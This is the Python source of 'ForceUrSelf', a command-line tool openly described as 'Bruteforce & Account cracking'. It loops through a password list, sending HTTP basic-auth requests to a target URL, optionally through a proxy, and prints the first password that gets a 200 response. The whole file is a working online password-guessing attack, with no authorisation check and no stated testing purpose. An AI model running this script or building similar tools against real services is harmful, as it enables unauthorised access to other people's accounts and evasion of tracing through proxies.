import requests
import os
import methods
import argparse
from platform import platform
from termcolor import colored

__author__ = "Sami Hindi"
__version__ = "1.0.0"

# Set OS Variable to user operating system
OS = "windows" if "windows" in platform().lower() else "linux"

# Set the username of the currently logged in user
USER_OS = os.getlogin()

# Bruteforce mode
def bruteforce(username: str, password_list: str, URL, proxy: str) -> None:
    print('Starting bruteforce mode...')
    response = None
    with open(password_list, 'r') as passwords:
        for password in passwords:
            password = password.strip()
            if proxy:
                proxies = {
                    'http': proxy,
                    'https': proxy
                }
                try:
                    response = requests.get(URL, auth=(username, password), proxies=proxies)
                except:
                    print(colored(f'Error: Invalid proxy', 'red'))
                    exit()
            else:
                response = requests.get(URL, auth=(username, password))
            if response.status_code == 200:
                print(colored(f'HIT: Password found: {password}', 'green'))
                break
            else:
                continue
    print('Finished bruteforce mode...')

def main(args: list[str]) -> None:
    '''
    Tool: ForceUrSelf
    Author: Sami Hindi
    Usage:
    Bruteforce & Account cracking
    License: GNU General Public Licesne V3.0
    OS: Windows & Linux
    '''
    USERNAME: str = ''
    PASSWORD_LIST: str = ''
    PROXY: str = ''
    MODE: str = ''
    VERBOSE: bool = False
    URL: str = ''
    
    for arg in args:
        if 'verbose' in arg:
            VERBOSE = True
        
        if 'mode' in arg:
            MODE = arg.split(':::')[1]
            
        if 'username' in arg:
            USERNAME = arg.split(':::')[1]
        
        if 'password_list' in arg:
            PASSWORD_LIST = arg.split(':::')[1]
            
        if 'proxy' in arg:
            PROXY = arg.split(':::')[1]
        
        if 'url' in arg:
            URL = arg.split(':::')[1]
    
    if MODE == 'bruteforce':
        bruteforce(USERNAME, PASSWORD_LIST, URL, PROXY)
    
    
if __name__ == '__main__':
    # Print logo
    methods.print_logo()
    
    # Instantiate the parser
    parser = argparse.ArgumentParser(description='ForceUrSelf - Bruteforce & Account cracking')
    
    # Get mode from arguments
    parser.add_argument('-m', '--mode', help='Mode to run ForceUrSelf in', required=True)
    
    # Take required username argument
    parser.add_argument('-u', '--username', type=str,
                        help='Username to bruteforce')
    
    parser.add_argument('-pl', '--password-list', type=str,
                        help='Passwordlist to use for provided username')
    
    # Add proxy argument
    parser.add_argument('-p', '--proxy', type=str,
                        help='Proxy to use for requests')
    
    # Add verbosity argument
    parser.add_argument('-v', '--verbose', action='store_true',
                        help='Use verbose mode')

    # Add URL argument
    parser.add_argument('-url', '--url', type=str,
                        help='URL to use for bruteforcing')
    
    # Parse the arguments
    args = parser.parse_args()
    
    # Handle arguments in parse args method
    parsed_args = methods.parse_args(args)
    
    # Run main method
    main(parsed_args)
    
    print(colored('ForceUrSelf has finished running.', 'green'))
    